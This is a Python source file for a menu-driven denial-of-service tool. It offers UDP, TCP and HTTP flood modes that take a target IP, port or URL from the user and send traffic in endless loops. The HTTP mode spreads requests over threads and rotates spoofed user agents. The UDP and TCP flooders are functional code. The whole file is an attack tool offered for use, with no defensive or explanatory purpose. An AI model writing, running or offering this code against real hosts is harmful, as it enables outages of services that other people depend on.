# By transcrime
# GPL-3.0 license


import socket
import random
import sys
import time
import cmd
import os
import threading
import requests
print("Select an option:")
print("1.Flood UDP")
print("2.Flood TCP")
print("3.Flood HTTP")
print("4.Exit")

choice = input("-->")

if choice == "1": # UDP is working
 #def udp_flood(target_ip, ipport):
  target_ip = input("put in ip --> ")
  ipport = int(input("now put in ip port --> "))
  client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #  Socket.AF_INET IS FOR IPv4, Socket.SOCK_DGRAM IS FOR UDP DATAGRAM BASED, CONNECTIONLESS  
  client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # ALLOWS THE SOCKET TO REUSE A LOCAL ADDRESS (IP AND PORT)
  packet = os.urandom(5024) # THIS GENERATES 5024 REANDOM BYTES
  client.sendto(packet, (target_ip, ipport))
  print("Targeting {target_ip}:{ipport} with UDP packet")
  try:
   while True:
       client.sendto(packet, (target_ip, ipport))
       print(f"Packet sent to {target_ip}:{ipport}")
  except KeyboardInterrupt:
   client.close()
   sys.exit()
elif choice == "2":
 target_ip = input("IP --> ")
 ipport = int(input("IP PORT --> "))
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Socket.SOCK_STREAM SPECIFICALLY THIS SOCKET WILL USE TCP 
 print(f"Start attacking on {target_ip}:{ipport}")
 client.connect((target_ip,ipport))
 client.send(b"\x10" * 5024)
 print(f"sending attack {target_ip}:{ipport}") 

 #for _ in range(5):
 try:
   while True:
       client.send(b"\x10" * 5024)
       print(f"sending attack {target_ip}:{ipport}")
 except KeyboardInterrupt:
   client.close()
   sys.exit()
 except ConnectionResetError:
   print("An existing connection was forcibly closed by the remote host - Most likely done by a firewall or something else")

elif choice == "3": # Working progress
 
 target_url = input("URL -->")
 num_threads = int(input("Threads -->"))
        
 user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
 ]
  
 def send_request():
  while True:
    try:
       headers = {"User-Agent": random.choice(user_agents)}

       response = requests.get(target_url, headers=headers)
       print(f"Senting request with {headers}{['User-Agent']}")
    except requests.exceptions.RequestException:
     print("Connection failed.")

 for _ in range(num_threads):
   thread = threading.Thread(target=send_request)
   thread.start
   print(F"HTTP FLOOD HAS SHART IT {num_threads} ON {target_url}")      
elif choice == "4":
   print("Exiting")
   exit    
 

#if __name__=="__main__":
 
  #if len(sys.argv) !=3:
   #print(" text <ip> <port>")

   #target_ip = sys.argv[1]
   #ipport = int(sys.argv[2])
   
   #while True:
    #udp_flood(target_ip, ipport)
 #try:
  #while True:
      #client.sendto(packet, (target_ip, ipport))
      #print(f"Packet sent to {target_ip}:{ipport}")
#except KeyboardInterrupt:
 #client.close()
 #sys.exit()


